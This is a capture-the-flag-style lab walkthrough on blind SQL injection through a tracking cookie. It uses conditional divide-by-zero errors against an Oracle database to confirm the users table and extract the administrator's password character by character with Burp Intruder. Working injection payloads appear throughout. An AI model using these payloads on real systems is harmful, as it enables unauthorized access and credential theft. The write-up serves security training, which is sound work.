This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

> Modify the TrackingId cookie, appending a single quotation mark to it, 

>> TrackingId=jrtdI9CBPX0Fm3Ob'

![image](https://github.com/udayk01/Web-Security/assets/52235763/30fe2658-f5d6-45ec-9e7b-0b4d10cb5b81)

> Changing it to two quotation marks:

>> TrackingId=jrtdI9CBPX0Fm3Ob''

> Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.

![image](https://github.com/udayk01/Web-Security/assets/52235763/9aadc875-b254-4885-ab6c-2cc1aa73c371)

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT '')||'

> In this case, notice that the query still appears to be invalid. This may be due to the database type - hence we try specifying a predictable table name in the query.

![image](https://github.com/udayk01/Web-Security/assets/52235763/ad5a88f4-abf0-4a47-b6cc-1444a6ff4079)

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT '' FROM dual)||'

> As we can no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.

![image](https://github.com/udayk01/Web-Security/assets/52235763/d5f8e569-f336-49b4-9495-c1fe38244e19)

> Now that we've crafted what appears to be a valid query, we can try submitting an invalid query while still preserving valid SQL syntax. 

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT '' FROM not-a-real-table)||'

> This time, an error is returned. This behavior strongly suggests that our injection is being processed as a SQL query by the back-end.

![image](https://github.com/udayk01/Web-Security/assets/52235763/93486835-6f70-4920-aac3-8650de684365)

> As long as we make sure to always inject syntactically valid SQL queries, we can use this error response to infer key information about the database.

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

> As this query does not return an error, we can infer that this table does exist. Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation.

![image](https://github.com/udayk01/Web-Security/assets/52235763/ee6bb118-e417-4f53-a3f1-5bf5c8aa36c8)

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

> We can verify that an error message is received.

![image](https://github.com/udayk01/Web-Security/assets/52235763/d1d7c310-2de6-4cc4-8bfe-3d3369be8991)

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

> We can verify that the error disappears. This demonstrates that we can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true

![image](https://github.com/udayk01/Web-Security/assets/52235763/9bb1279c-3bb0-478a-8f9f-61c7319fffe8)

> We can use this behavior to test whether specific entries exist in a table. For example, we use the following query to check whether the username administrator exists:

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

> We can verify that the condition is true (the error is received), confirming that there is a user called administrator.

![image](https://github.com/udayk01/Web-Security/assets/52235763/aeb7cfee-de54-40c6-b588-b1097fa5c531)

> The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

> This condition should be true, confirming that the password is greater than 1 character in length.

![image](https://github.com/udayk01/Web-Security/assets/52235763/cbe8a6bd-f154-4096-93fa-e65d0c9156a3)

> Send a series of follow-up values to test different password lengths. Send:

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

![image](https://github.com/udayk01/Web-Security/assets/52235763/0a7b3735-588b-475a-8655-fab0bd71a4a7)

>> TrackingId=jrtdI9CBPX0Fm3Ob'||(SELECT CASE WHEN LENGTH(password)>25 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 
> And so on. You can do this manually using Burp Repeater, since the length is likely to be short. We understand that the password is less than 25 character in length. 

![image](https://github.com/udayk01/Web-Security/assets/52235763/c657c4c3-afb6-4fae-9868-61ea222a84dd)

> After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

![image](https://github.com/udayk01/Web-Security/assets/52235763/158c0458-0a95-42d4-84a5-ed42a29476da)

![image](https://github.com/udayk01/Web-Security/assets/52235763/3f80ad28-92bf-4414-9c9d-4634ff7febd6)

![image](https://github.com/udayk01/Web-Security/assets/52235763/4c21873a-d4e9-4cb5-b0ab-3eda5cbbec95)

![image](https://github.com/udayk01/Web-Security/assets/52235763/2bc26502-e900-4e81-ad04-1ffa1aff9fed)

> the password characters are the ones that return the status code 500.

![image](https://github.com/udayk01/Web-Security/assets/52235763/0464c414-729a-4aaf-bf22-ac61efd6c3cb)

![image](https://github.com/udayk01/Web-Security/assets/52235763/d19844f9-7416-4f77-8364-38bd1c5bc66f)

> The password of the user administrator is - 32tkd1i2yh35svv4ctcv

> We can see that with the retrieved password we logged in to the administrator account.

![image](https://github.com/udayk01/Web-Security/assets/52235763/0e049f8c-86d7-4afe-b702-637134471bdb)
















